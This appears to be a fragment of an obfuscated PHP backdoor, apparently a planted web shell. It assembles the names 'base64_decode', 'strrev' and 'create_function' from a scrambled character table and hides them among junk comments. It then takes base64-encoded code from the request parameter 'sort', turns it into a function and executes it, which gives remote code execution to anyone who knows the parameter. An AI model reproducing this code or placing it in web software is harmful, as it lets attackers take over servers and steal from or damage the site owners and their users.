...
$dhFplEgh654 = "5pvtrsinw2*d6)_0e4(;7cj3f8kyu9qaxbm.glo/1zh";


$IwmfYkVp1029 = "";

foreach([5,38,4,3] as $W){
       $IwmfYkVp1029 .= $dhFplEgh654[$W];
    }


if(isset($REQUEST /*ETbJftZQaQzIydzOmxxpBRrObDHqZyqBgTRzHIiPoiODlkGslhkozRyWMFTvjpvoCnBJcrlivTWRSLIqelRIrkxyqaYTmztvRafmruhUwYYzsGCGQIrucWquNPXKjekW*/["$IwmfYkVp1029"])){
    $ahCizQXZ8159 = $_REQUEST /*ETbJftZQaQzIydzOmxxpBRrObDHqZyqBgTRzHIiPoiODlkGslhkozRyWMFTvjpvoCnBJcrlivTWRSLIqelRIrkxyqaYTmztvRafmruhUwYYzsGCGQIrucWquNPXKjekW*/["$IwmfYkVp1029"];
    $iOSYTCxG2880 = "";
    $WPBUDHaH9973 = "";

    /*LBHcdJeXPVZbVQcHTyAFGyepJVYBYuVIZafBJspzBAJtzeYBdivPjrLArKeCzSnlfUxuiutugymdXLOOglkrGDmfTSeWUJAiggIGBQqJFQIipLxudHSnViGeptYKiTFz*/

    foreach([33,31,5,16,12,17,14,11,16,21,38,11,16] as $W){
       $iOSYTCxG2880 .= $dhFplEgh654[$W];
    }

    /*aNNmOFhrXBZFAfZvUxuDfhUwEoLSqxEiNMLlUOStjGiwETvOEHPmhzbiMCrtruxmugDETqwOoemHCaKBikdpelcnOkRnmLjJUSprMmTDnViltATIFglLUrWLKllBavPz*/


    foreach([5,3,4,4,16,2] as $W){
       $WPBUDHaH9973 .= $dhFplEgh654[$W];
    }

    /*oZTwzBkLfgYjevWiWwnADQKDzGyjHzoJBysWfjvnRLIAJIRcgfiJgIrPhvEkjWGmIsKPFmziwJllhpHpjiXmCUSuJDEEDNTjJEVbYHwxVbIpyqqWgFFiSzmsfexsRXYA*/

    $W = $WPBUDHaH9973('n'.'o'.''.'i'.''.''.''.''.'t'.''.''.'c'.'n'.'u'.''.''.'f'.'_'.''.''.''.''.'e'.'t'.'a'.'e'.'r'.''.''.''.'c'.''.'');
    $U = $W("", $iOSYTCxG2880($ahCizQXZ8159));
    $U();
    exit();
